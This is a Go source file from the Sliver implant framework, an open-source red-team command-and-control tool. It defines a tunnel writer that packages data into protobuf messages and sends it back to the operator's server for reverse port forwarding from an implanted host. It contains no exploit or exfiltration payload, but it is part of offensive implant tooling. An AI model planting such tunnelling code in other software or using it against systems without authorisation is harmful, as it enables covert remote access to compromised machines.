package rportfwd

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// tunnelWriter - Sends data back to the server based on data read()
// I know the reader/writer stuff is a little hard to keep track of
type tunnelWriter struct {
	tun      *transports.Tunnel
	conn     *transports.Connection
	host     string
	port     uint32
	protocol int
	tunnelID uint64
}

func (tw tunnelWriter) Write(data []byte) (int, error) {
	n := len(data)
	createReverse := false
	rportfwdInfo := &sliverpb.RPortfwd{}
	if tw.tun.WriteSequence() == 0 {
		createReverse = true
		rportfwdInfo.Host = tw.host
		rportfwdInfo.Port = tw.port
		rportfwdInfo.Protocol = int32(tw.protocol)
		rportfwdInfo.TunnelID = tw.tunnelID
	}
	data, err := proto.Marshal(&sliverpb.TunnelData{
		Sequence:      tw.tun.WriteSequence(), // The tunnel write sequence
		Ack:           tw.tun.ReadSequence(),
		TunnelID:      tw.tun.ID,
		Data:          data,
		CreateReverse: createReverse,
		Rportfwd:      rportfwdInfo,
	})
	// {{if .Config.Debug}}
	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, tw.tun.WriteSequence(), tw.tun.ReadSequence())
	// {{end}}
	tw.tun.IncWriteSequence() // Increment write sequence
	tw.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
	return n, err
}
